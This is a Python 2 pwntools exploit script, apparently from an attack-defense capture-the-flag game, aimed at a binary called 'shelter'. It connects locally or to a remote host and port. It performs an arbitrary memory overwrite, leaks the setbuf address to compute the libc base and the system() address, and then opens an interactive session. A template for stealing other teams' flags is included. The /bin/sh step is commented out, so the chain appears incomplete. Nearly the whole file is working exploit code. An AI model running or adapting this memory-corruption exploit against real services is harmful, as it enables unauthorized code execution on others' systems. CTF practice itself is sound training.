#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import json
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import socket
from pwn import *
import time

context.terminal = 'tmux splitw -h'.split()

# CHANGE THESE
exe = context.binary = ELF('./shelter')


gdbscript = """
continue
""".format(**locals())


def hostToIP(host):
	num = int(host.replace("team",""))
	part = "{0}.{1}".format(129+((num&0xff00)>>8),(num&0xff))
	return "172.31."+part

def start(argv=[], *a, **kw):
	if args.GDB:
		io = gdb.debug([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		# AND THIS
		io = remote("honj.in", 4024)
	else:
		io = process([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, *a, **kw)
	return io

def runJob():
	s = start()
	def overwrite(what, where):
		s.sendline("L")
		print s.recv(1024)
		s.sendline("1")
		print s.recv(1024)
		s.sendline("AA")
		print s.recv(1024)
		s.sendline("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+what)
		print s.recv(1024)
		s.sendline(str(int(where)))
		print s.recv(2000)

	# any stdout in here gets redirected to the log file
	# you can check this log by either looking at the log file (same directory),
	# or by using the command 'print <job name> [number of lines]' in the launcher

	overwrite("\x08\x05\x10\xa0"[::-1], "134549516")
	s.sendline("R")
	s.sendline("A")
	s.sendline("1")
	s.sendline("1")
	s.recv(2000).encode('hex').split("0a")
	setbuf = u32(s.recv(2000).encode('hex').split("0a")[-1][:8].decode('hex'))
	log.info("SETBUF AT {0:x}".format(setbuf))

	libc = setbuf - 0x000670c0
	log.info("LIBC AT {0:x}".format(libc))

	system = libc + 0x0003fe70
	log.info("SYSTEM AT {0:x}".format(system))


	# print s.recv(1024).encode('hex')
	# s.sendline("/bin/sh")
	# print s.recv(1024)
	# s.sendline("R")
	# print s.recv(1024)
	# s.sendline("R")
	# print s.recv(1024)

	s.interactive()

 
def fakeJob(ip):
	return True # Return anything not False here

'''
	   {
           'team_name' : "Team name",
           'hostname' : "hostname",
           'port' : <int port number>,
           'flag_id' : "Flag ID to steal",
           'team_id': <int team id>
       },
'''

if __name__ == "__main__":
	runJob()



